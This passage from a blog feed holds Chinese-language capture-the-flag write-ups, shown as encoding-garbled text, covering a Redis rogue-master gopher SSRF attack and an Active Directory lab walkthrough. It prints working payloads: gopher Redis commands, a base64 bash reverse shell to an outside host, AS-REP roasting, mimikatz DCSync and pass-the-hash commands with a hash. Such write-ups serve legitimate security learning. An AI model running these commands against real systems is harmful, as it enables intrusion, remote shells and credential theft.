alt="image-20260218213544251"></p><p>ä¸€å¼€å§‹è€ƒè™‘çš„æ˜¯èƒ½ä¸èƒ½å†™ä¸ªæœ¨é©¬è¿›å»ï¼Œä½†æ˜¯è¿™é‡Œä¸è¡Œï¼Œè€Œä¸”å‘Šè¯‰äº†ä½ redisçš„å¯†ç ï¼Œäºæ˜¯æˆ‘å»è¿æ¥ä½†æ˜¯è¿æ¥ä¸ä¸Šï¼Œåº”è¯¥æ˜¯å†…ç½‘å¼€äº†redisï¼Œè¿™é‡Œè€ƒè™‘redisä¸»ä»å¤åˆ¶</p><blockquote><p>ä¸»ä»å¤åˆ¶ï¼Œæ˜¯æŒ‡å°†ä¸€å°RedisæœåŠ¡å™¨çš„æ•°æ®ï¼Œå¤åˆ¶åˆ°å…¶ä»–çš„RedisæœåŠ¡å™¨ã€‚å‰è€…ç§°ä¸ºä¸»èŠ‚ç‚¹(master)ï¼Œåè€…ç§°ä¸ºä»èŠ‚ç‚¹(slave)ï¼›æ•°æ®çš„å¤åˆ¶æ˜¯å•å‘çš„ï¼Œåªèƒ½ç”±ä¸»èŠ‚ç‚¹åˆ°ä»èŠ‚ç‚¹ã€‚</p><p>redisçš„æŒä¹…åŒ–ä½¿å¾—æœºå™¨å³ä½¿é‡å¯æ•°æ®ä¹Ÿä¸ä¼šä¸¢å¤±ï¼Œå› ä¸ºredisæœåŠ¡å™¨é‡å¯åä¼šæŠŠç¡¬ç›˜ä¸Šçš„æ–‡ä»¶é‡æ–°æ¢å¤åˆ°å†…å­˜ä¸­ï¼Œä½†æ˜¯å¦‚æœç¡¬ç›˜çš„æ•°æ®è¢«åˆ é™¤çš„è¯æ•°æ®å°±æ— æ³•æ¢å¤äº†ï¼Œé‚£ä¹ˆæ­¤æ—¶å°±å¯ä»¥é€šè¿‡ä¸»ä»å¤åˆ¶å°±èƒ½è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œä¸»redisçš„æ•°æ®å’Œä»redisä¸Šçš„æ•°æ®ä¿æŒå®æ—¶åŒæ­¥ï¼Œå½“ä¸»rediså†™å…¥æ•°æ®å°±å¯ä»¥é€šè¿‡ä¸»ä»å¤åˆ¶å¤åˆ¶åˆ°å…¶å®ƒä»redisã€‚</p></blockquote><p>åªè¦æ˜¯æœªç¦ç”¨ SLAVEOF å‘½ä»¤ä¸”æœªæˆæƒæˆ–è€…çŸ¥é“å¯†ç ï¼Œå°±å¯ä»¥æ‰“ã€‚ä¸»ä»å¤åˆ¶ç®€å•æ¥è¯´å°±æ˜¯ä¸€ä¸ªåŒæ­¥åŠŸèƒ½ï¼Œé‚£ä¹ˆè¿™é‡Œçš„æ€è·¯å°±æ˜¯æˆ‘ä»¬ä¼ªé€ ä¸€å°ä¸»redis</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/n0b0dyCN/redis-rogue-server</span><br><span class="line"><span class="params">#</span> redis-rogue-serverï¼Œæœªæˆæƒä½¿ç”¨</span><br><span class="line"></span><br><span class="line">https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server</span><br><span class="line"><span class="params">#</span> Awsome-Redis-Rogue-Serverï¼Œæœ‰æˆæƒä½¿ç”¨</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¦å°†redis-rogue-serverçš„exp.soæ–‡ä»¶å¤åˆ¶åˆ°Awsome-Redis-Rogue-Serverä¸­ï¼Œä½¿ç”¨Awsome-Redis-Rogue-Serverå·¥å…·å¼€å¯ä¸»æœåŠ¡ï¼Œå¹¶ä¸”æ¶æ„soæ–‡ä»¶æŒ‡å®šä¸ºexp.soï¼Œå› ä¸ºexp.soé‡Œé¢æœ‰systemæ¨¡å—</p><p>å…ˆå¼€å¯ä¸€ä¸‹ä¸»æœåŠ¡</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 redis<span class="built_in">_</span>rogue<span class="built_in">_</span>server.py -v -path exp.so -lport 21000</span><br></pre></td></tr></table></figure><p>ç„¶ååˆ©ç”¨gopheråè®®å¯¹redisè¿›è¡Œä¸€ä¸ªåˆ©ç”¨</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">å…ˆsetå¤‡ä»½è·¯å¾„ä¸º/tmp</span><br><span class="line">gopher://0.0.0.0:6379/<span class="built_in">_</span>auth<span class="comment">%2520root%250d%250aconfig%2520set%2520dir%2520/tmp/%250d%250aquit</span></span><br><span class="line"></span><br><span class="line">gopher://0.0.0.0:6379/<span class="built_in">_</span>auth root</span><br><span class="line">config set dir /tmp/</span><br><span class="line">quit</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°±å¯ä»¥è¿›è¡Œä¸€ä¸ªåŒæ­¥äº†</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gopher://0.0.0.0:6379/<span class="built_in">_</span>auth<span class="comment">%2520root%250d%250aconfig%2520set%2520dbfilename%2520exp.so%250d%250aslaveof%2520xx.xx.xx.xx%252021000%250d%250aquit</span></span><br><span class="line"></span><br><span class="line">gopher://0.0.0.0:6379/<span class="built_in">_</span>auth root</span><br><span class="line">config set dbfilename exp.so</span><br><span class="line">slaveof xx.xx.xx.xx 21000</span><br><span class="line">quit</span><br></pre></td></tr></table></figure><p>åŠ è½½æ¨¡å—</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gopher://0.0.0.0:6379/<span class="built_in">_</span>auth<span class="comment">%2520root%250d%250amodule%2520load%2520./exp.so%250d%250aquit</span></span><br><span class="line"></span><br><span class="line">gopher://0.0.0.0:6379/<span class="built_in">_</span>auth root</span><br><span class="line">module load ./exp.so</span><br><span class="line">quit</span><br></pre></td></tr></table></figure><p>å…³é—­ä¸»ä»åŒæ­¥</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gopher://0.0.0.0:6379/<span class="built_in">_</span>auth<span class="comment">%2520root%250d%250aslaveof%2520NO%2520ONE%250d%250aquit</span></span><br><span class="line"></span><br><span class="line">gopher://0.0.0.0:6379/<span class="built_in">_</span>auth root</span><br><span class="line">slaveof NO ONE</span><br><span class="line">quit</span><br></pre></td></tr></table></figure><p>å‘½ä»¤æ‰§è¡Œè·å–flagæˆ–è€…åå¼¹shell</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gopher://0.0.0.0:6379/<span class="built_in">_</span>auth<span class="comment">%2520root%250d%250asystem.exec%2520%2522cat%2520%252Fflag%2522%250d%250aquit</span></span><br><span class="line"></span><br><span class="line">gopher://0.0.0.0:6379/<span class="built_in">_</span>auth root</span><br><span class="line">system.exec &quot;cat /flag&quot;</span><br><span class="line">quit</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ˜¯åå¼¹shellï¼šsystem.rev xx.xx.xx.xx 6666</p><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>ç®—æ˜¯äº†è§£äº†ä¸»ä»å¤åˆ¶è¿™ä¹ˆä¸ªä¸œè¥¿ï¼Œç„¶åå†è¯´è¯´é‡åˆ°çš„é—®é¢˜å§ï¼Œé¦–å…ˆæ˜¯buuçš„é¶æœºä¸å‡ºç½‘çš„é—®é¢˜ï¼Œç„¶åå®˜æ–¹æ˜¯ç»™äº†è§£å†³åŠæ³•çš„æ­å»ºä¸ªéš§é“ï¼Œç„¶åå¦å¤–å°±æ˜¯æˆ‘çš„å·¥å…·å†kaliç„¶åéš§é“æ˜¯å’Œç‰©ç†æœºæ­å»ºçš„ï¼Œä½†æ˜¯æˆ‘ä¸æƒ³ä¸‹è½½ä¸œè¥¿äº†ï¼Œäºæ˜¯äº†è§£åˆ°å¯ä»¥ä½¿ç”¨æµé‡è½¬å‘</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenport=21000 listenaddress=ip connectport=21000 connectaddress=kaliip</span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2026/1/image-20260218220142273.png" alt="image-20260218220142273"></p><p>ç„¶åå°±è½¬å‘åˆ°kaliå°±å»ï¼Œokä¸é”™ï¼</p>]]></content>
      
      
      <categories>
          
          <category> æ‚é¡¹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redisä¸»ä»å¤åˆ¶ </tag>
            
            <tag> xxe </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ˜¥ç§‹äº‘é•œTime</title>
      <link href="/2026/01/07/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTime/"/>
      <url>/2026/01/07/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTime/</url>
      
        <content type="html"><![CDATA[<h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>fscanæ‰«ä¸€ä¸‹<code>./fscan.exe -h 39.99.225.0 -p 1-65535</code></p><p>æ‰«å‡ºæ¥æœ‰ä¸ªNeo4j Browserï¼Œå­˜åœ¨nday(<a href="https://github.com/zwjjustdoit/CVE-2021-34371.jar)%EF%BC%8C%E5%BC%B9%E4%B8%AAshell%E5%88%B0%E8%87%AA%E5%B7%B1vps%E4%B8%8A%EF%BC%8C%E7%94%A8%E6%88%B7%E7%9B%AE%E5%BD%95%E7%9B%B4%E6%8E%A5%E6%8B%BFflag">https://github.com/zwjjustdoit/CVE-2021-34371.jar)ï¼Œå¼¹ä¸ªshellåˆ°è‡ªå·±vpsä¸Šï¼Œç”¨æˆ·ç›®å½•ç›´æ¥æ‹¿flag</a></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar .<span class="keyword">\rhino</span><span class="built_in">_</span>gadget.jar rmi://39.99.128.12:1337 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzUueHgueHgueHgvOTk5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; </span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2026/1/image-20260107205245814.png" alt="image-20260107205245814"></p><h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>ä»vpsä¸Šä¸‹è½½ç›¸å…³å·¥å…·å¼€å§‹æ‰“å†…ç½‘</p><p>æ‰«ä¸€ä¸‹å†…ç½‘</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">172.22.6.25:135 open</span><br><span class="line">172.22.6.12:139 open</span><br><span class="line">172.22.6.12:135 open</span><br><span class="line">172.22.6.38:80 open</span><br><span class="line">172.22.6.38:22 open</span><br><span class="line">172.22.6.36:22 open</span><br><span class="line">172.22.6.12:88 open</span><br><span class="line">172.22.6.25:445 open</span><br><span class="line">172.22.6.12:445 open</span><br><span class="line">172.22.6.25:139 open</span><br><span class="line">172.22.6.36:7687 open</span><br><span class="line">[*] alive ports len is: 11</span><br><span class="line">start vulscan</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.6.25</span><br><span class="line">   [-&gt;]WIN2019</span><br><span class="line">   [-&gt;]172.22.6.25</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.6.12</span><br><span class="line">   [-&gt;]DC-PROGAME</span><br><span class="line">   [-&gt;]172.22.6.12</span><br><span class="line">[*] NetBios 172.22.6.25     XIAORANG<span class="keyword">\WIN</span>2019              </span><br><span class="line">[*] OsInfo 172.22.6.12(Windows Server 2016 Datacenter 14393)</span><br><span class="line">[*] NetBios 172.22.6.12     [+] DC:DC-PROGAME.xiaorang.lab       Windows Server 2016 Datacenter 14393</span><br><span class="line">[*] WebTitle http://172.22.6.38        code:200 len:1531   title:åå°ç™»å½•</span><br><span class="line">[*] WebTitle https://172.22.6.36:7687  code:400 len:50     title:None</span><br></pre></td></tr></table></figure><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">172.22.6.38 webæœºå™¨ï¼Œå¯ä»¥åå°ç™»å½•ï¼Ÿ</span><br><span class="line">172.22.6.36 å·²ç»è¢«æ§</span><br><span class="line">172.22.6.25 XIAORANG<span class="keyword">\WIN</span>2019</span><br><span class="line">172.22.6.12 DC-PROGAME.xiaorang.lab</span><br></pre></td></tr></table></figure><p>æ­å»ºä¸ªéš§é“çœ‹çœ‹38ï¼Œè®¤çœŸçš„ï¼Ÿä¸‡èƒ½å¯†ç ç›´æ¥å°±ç™»å½•æˆåŠŸï¼Œé‚£ä¹ˆsqlmapä¸€æŠŠæ¢­å“ˆ</p><p>burpsuiteæœ¬èº«å°±å¯ä»¥å»ºç«‹socks5ä»£ç†</p><p><img src="/../images/achieve/2026/1/image-20260107210729433.png" alt="image-20260107210729433"></p><p>ç„¶åsqlmapä¸€æŠŠæ¢­(æ³¨æ„ä¸€ä¸‹æ˜¯socks5åè®®)</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -r &quot;sql.txt&quot; --proxy &quot;socks5://ip:port&quot; --dump</span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2026/1/image-20260107212159501.png" alt="image-20260107212159501"></p><p>å¾—åˆ°flag2å’Œä¸€å †ç”¨æˆ·</p><h2 id="flag3-flag4"><a href="#flag3-flag4" class="headerlink" title="flag3&amp;flag4"></a>flag3&amp;flag4</h2><p>å†™ä¸ªè„šæœ¬æŠŠç”¨æˆ·åæå–å‡ºæ¥ä¿å­˜ä¸ºuser.txt</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰“å¼€åŸå§‹æ•°æ®æ–‡ä»¶</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    data = file.readlines()</span><br><span class="line"></span><br><span class="line"><span class="comment"># æå–æŒ‡å®šå­—ç¬¦ä¸²</span></span><br><span class="line">users = []</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> data:</span><br><span class="line">    <span class="keyword">match</span> = re.search(<span class="string">r&#x27;(\w+)@xiaorang.lab&#x27;</span>, line)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">        username = <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line">        users.append(username)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¿å­˜æå–åçš„å­—ç¬¦ä¸²åˆ° user.txt</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;user.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="keyword">for</span> user <span class="keyword">in</span> users:</span><br><span class="line">        file.write(user + <span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨è·å–åˆ°çš„ç”¨æˆ·è¿›è¡ŒASREPRoastæ”»å‡»</p><blockquote><p>ASREPRoastæ”»å‡»æ˜¯ä¸€ç§ç¦»çº¿çˆ†ç ´ç”¨æˆ·è´¦å·çš„æ”»å‡»æ–¹å¼ï¼Œå®ƒåˆ©ç”¨äº†Kerberosé¢„èº«ä»½éªŒè¯çš„å±€é™æ€§ã€‚æ”»å‡»è€…éœ€è¦ç”¨æˆ·è´¦å·è®¾ç½®â€œä¸è¦æ±‚Kerberosé¢„èº«ä»½éªŒè¯â€é€‰é¡¹ï¼Œè€Œè¯¥é€‰é¡¹é»˜è®¤æ˜¯æ²¡æœ‰å‹¾é€‰çš„ã€‚å½“æ”»å‡»è€…å‹¾é€‰äº†è¯¥é€‰é¡¹åï¼ŒåŸŸæ§ä¸ä¼šè¿›è¡Œä»»ä½•éªŒè¯ï¼Œç›´æ¥è¿”å›ç”¨æˆ·HashåŠ å¯†çš„Session Keyã€‚æ”»å‡»è€…å¯ä»¥ä½¿ç”¨è¿™äº›Session Keyè¿›è¡Œç¦»çº¿ç ´è§£ï¼Œå¦‚æœå­—å…¸è¶³å¤Ÿå¼ºå¤§ï¼Œå°±èƒ½ç ´è§£å¾—åˆ°è¯¥æŒ‡å®šç”¨æˆ·çš„æ˜æ–‡å¯†ç ã€‚</p><p>ä½¿ç”¨æŒ‡å®šç”¨æˆ·å‘åŸŸæ§åˆ¶å™¨çš„Kerberos 88ç«¯å£è¯·æ±‚ç¥¨æ®ï¼Œæ­¤æ—¶åŸŸæ§ä¸ä¼šè¿›è¡Œä»»ä½•éªŒè¯å°±å°†TGTå’Œè¯¥ç”¨æˆ·HashåŠ å¯†çš„Login Session Key è¿”å›ã€‚è¿›è¡Œç¦»çº¿ç ´è§£ï¼Œå¾—åˆ°è´¦æˆ·å¯†ç </p></blockquote><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">AS-REP</span><br><span class="line"></span><br><span class="line">KDCæ¥å—åˆ°è¯·æ±‚åï¼Œä¼šå…ˆé€šè¿‡ADæ´»åŠ¨ç›®å½•æŸ¥è¯¢è¯¥ç”¨æˆ·çš„å¯†ç Hashï¼Œç„¶åASä¼šä½¿ç”¨Client<span class="built_in">_</span>hashå¯¹è¯·æ±‚åŒ…ä¸­çš„</span><br><span class="line"></span><br><span class="line">Authenticatorè¿›è¡Œè§£å¯†ï¼Œè§£å¯†æˆåŠŸä¸”æ—¶é—´æˆ³èŒƒå›´åœ¨äº”åˆ†é’Ÿå†…åˆ™è¿”å›ç”¨krbtgtç”¨æˆ·(å®ƒæ˜¯ Windows åŸŸçš„å†…ç½®æœåŠ¡è´¦</span><br><span class="line"></span><br><span class="line">æˆ·ï¼Œå¯†ç ç”±ç³»ç»Ÿéšæœºç”Ÿæˆä¸”æ— æ³•æ‰‹åŠ¨ç™»å½•ï¼Œå”¯ä¸€ä½œç”¨æ˜¯åŠ å¯† TGT)hashåŠ å¯†çš„TGTç¥¨æ®ï¼ŒTGTé‡Œé¢åŒ…å«PAC (ç‰¹æƒå±æ€§è¯</span><br><span class="line"></span><br><span class="line">ä¹¦)  ï¼ŒPACåŒ…å«Clientçš„sidã€Clientæ‰€åœ¨çš„ç»„ã€‚é™¤æ­¤ä¹‹å¤–ASä¼šç”Ÿæˆä¸€ä¸ªä¸´æ—¶ç§˜é’¥Login session keyï¼Œå¹¶ä½¿ç”¨ç”¨</span><br><span class="line"></span><br><span class="line">æˆ·(ä¹‹å‰å‘è¯·æ±‚é‚£ä¸ªç”¨æˆ·)NTLM-HashåŠ å¯†Login session keyä½œä¸ºå“åº”åŒ…çš„ä¸€éƒ¨åˆ†å†…å®¹</span><br></pre></td></tr></table></figure><p>ç®€å•æ¥è¯´é—®é¢˜å‘ç”Ÿåœ¨Kerberosè®¤è¯çš„AS-REPé˜¶æ®µï¼Œæ­£å¸¸å®ƒæ˜¯ä¼šå¯¹AS-REQè¯·æ±‚è¿›è¡ŒéªŒè¯ï¼Œä½†æ˜¯è¿™é‡Œæ²¡æœ‰éªŒè¯é€ æˆäº†å®‰å…¨æ¼æ´</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-GetNPUsers -dc-ip 172.22.6.12 -usersfile user.txt xiaorang.lab/</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">$</span>krb5asrep<span class="built_in">$</span>23<span class="built_in">$</span>zhangxin@XIAORANG.LAB:8daf09967e221dc17252826aa139c286<span class="built_in">$</span>656611f099399fde29fa03f432c21f06184ffdd14850e4707a694267aac71b7eaaa09f79540bb2e4fcbfb2647c4b7a8391116df720373e9229c730f2157b8b8df6509a456c2af34ad0529d11331b1b5ef60626764302353ae458249c1c8e75692f9bd1ea909b8bd95c3b028757d1c3262de05678284e09c449d0fc4e51ffe96c5c9409da44ad49e025494b10551b6de744d38741a40dc3980a357cfd1c6010672fa7b653e64932b51bc93ccb0552c2eddd1b0d13ea842c52dacaddafab9ec64b15eb36b9fa907418493005c014a40db6a3e96c4b1cbfb4c2a627eb4a575089b0426af9a70895290ec0fdd476</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨hashcatè¿›è¡Œç ´è§£</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 -m 18200 --force hash.txt rockyou.txt</span><br><span class="line"></span><br><span class="line">hashcat -a 0 -m 18200 --force hash.txt rockyou.txt --show</span><br><span class="line">æ‹¿åˆ°å¯†ç ï¼šstrawberry</span><br><span class="line">è´¦å·å°±æ˜¯ï¼šzhangxin@XIAORANG.LAB</span><br></pre></td></tr></table></figure><p>rdpè¯•ä¸€ä¸‹172.22.6.25æˆåŠŸäº†ï¼Œä½†æ˜¯æ²¡æƒé™å•Šï¼Œå¤ªä½äº†æƒé™</p><p><code>query user</code>çœ‹çœ‹è¿˜æœ‰è°ç™»å½•</p><p><img src="https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/2023/08/7-1-1024x278.png" alt="img"></p><p>å‘ç°yuxuanï¼Œç”¨æˆ·ä¸è®¡ç®—æœºæ—¶è¿›è¡Œä¼šè¯æ—¶ï¼Œå‡­æ®ä¼šä¿ç•™åœ¨å†…å­˜ä¸­ï¼Œè¯´æ˜yuxuanè¿™ä¸ªç”¨æˆ·ç™»å½•è¿‡WIN2019ï¼Œå¾ˆå¤šç”¨æˆ·ä¹ æƒ¯å°†è®¡ç®—æœºè®¾ç½®è‡ªåŠ¨ç™»å½•ï¼Œè¿™æ ·å°±å¯ä»¥æŸ¥è¯¢æ³¨å†Œè¡¨æ¥è·å–è‡ªåŠ¨ç™»å½•çš„ç”¨æˆ·åå’Œå¯†ç äº†ã€‚</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY<span class="built_in">_</span>LOCAL<span class="built_in">_</span>MACHINE<span class="keyword">\SOFTWARE</span><span class="keyword">\Microsoft</span><span class="keyword">\Windows</span> NT<span class="keyword">\CurrentVersion</span><span class="keyword">\Winlogon</span>&quot;</span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2026/1/image-20260107233812932.png" alt="image-20260107233812932"></p><p>ä½¿ç”¨è¿™ä¸ªç”¨æˆ·é‡æ–°å»ç™»å½•ä¸€ä¸‹ï¼Œç„¶åä½¿ç”¨å·¥å…·SharpHoundè¿›è¡Œæ•°æ®é‡‡é›†</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpHound.exe -c all</span><br></pre></td></tr></table></figure><p>æˆ‘ä¹‹å‰é‡‡é›†çš„æ˜¯zhangxinï¼Œåé¢æçƒ¦äº†ï¼Œçœ‹wpæ‰“å¥½å¤šéƒ½ä¸æ˜æ‰€ä»¥ç„¶ï¼Œè‡ªå·±ç›²æ‰“å°±å›°éš¾ã€‚ç›´æ¥æ‹¿å¸ˆå‚…ä»¬çš„å›¾</p><p><img src="/../images/achieve/2026/1/image-20260107231729501.png" alt="image-20260107231729501"></p><p>å‘ç°è¿™ä¸ªç”¨æˆ·æ»¥ç”¨äº†SIDå†å²åŠŸèƒ½</p><blockquote><p>SIDHistoryæ˜¯ä¸€ä¸ªä¸ºæ”¯æŒåŸŸè¿ç§»æ–¹æ¡ˆè€Œè®¾ç½®çš„å±æ€§ï¼Œå½“ä¸€ä¸ªå¯¹è±¡ä»ä¸€ä¸ªåŸŸè¿ç§»åˆ°å¦ä¸€ä¸ªåŸŸæ—¶ï¼Œä¼šåœ¨æ–°åŸŸåˆ›å»ºä¸€ä¸ªæ–°çš„SIDä½œä¸ºè¯¥å¯¹è±¡çš„objectSidï¼Œåœ¨ä¹‹å‰åŸŸä¸­çš„SIDä¼šæ·»åŠ åˆ°è¯¥å¯¹è±¡çš„SIDHistoryå±æ€§ä¸­ï¼Œæ­¤æ—¶è¯¥å¯¹è±¡å°†ä¿ç•™åœ¨åŸæ¥åŸŸçš„SIDå¯¹åº”çš„è®¿é—®æƒé™</p></blockquote><p>ä¹Ÿå°±æ˜¯è¯´è¯¥ç”¨æˆ·åœ¨åŸŸè¿ç§»åï¼Œä»æ‹¥æœ‰å‰åŸŸçš„æƒé™ã€‚é‚£ä¹ˆå»dump hash</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2026/1/image-20260107232346779.png" alt="image-20260107232346779"></p><p>ç›´æ¥æŠŠåŸŸç®¡ç†å‘˜å“ˆå¸Œdumpäº†ï¼Œæ‰€ä»¥ç›¸å½“äºå·²ç»æ‹¿ä¸‹åŸŸæ§äº†,æ¥ä¸‹æ¥å°±æ˜¯PTH</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-wmiexec  XIAORANG/administrator@172.22.6.25   -hashes :04d93ffd6f5f6e4490e0de23f240a5e9</span><br><span class="line"></span><br><span class="line">proxychains4 impacket-wmiexec  XIAORANG/administrator@172.22.6.12   -hashes :04d93ffd6f5f6e4490e0de23f240a5e9</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¸çŸ¥é“æ˜¯æˆ‘å¼€ç€æ¢¯å­è¿˜æ˜¯ä»€ä¹ˆé¬¼åŸå› ï¼Œå¯¼è‡´ä¸€å¼€å§‹ä¸€ç›´time outåé¢æŠŠæ¢¯å­å…³äº†ï¼Œé‡å¯äº†ä¸€ä¸‹kaliå°±å¥½äº†</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">åˆ†åˆ«æ‹¿flag</span><br><span class="line">type  C:<span class="keyword">\Users</span><span class="keyword">\Adminstrator</span><span class="keyword">\flag</span><span class="keyword">\flag</span>03.txt</span><br><span class="line">type  C:<span class="keyword">\Users</span><span class="keyword">\Adminstrator</span><span class="keyword">\flag</span><span class="keyword">\flag</span>04.txt</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pass the hash </tag>
            
            <tag> SIDæ»¥ç”¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>something-about-XSS-Challenges</title>
      <link href="/2026/01/04/something-about-XSS-Challenges/"/>
      <url>/2026/01/04/something-about-XSS-Challenges/</url>
      
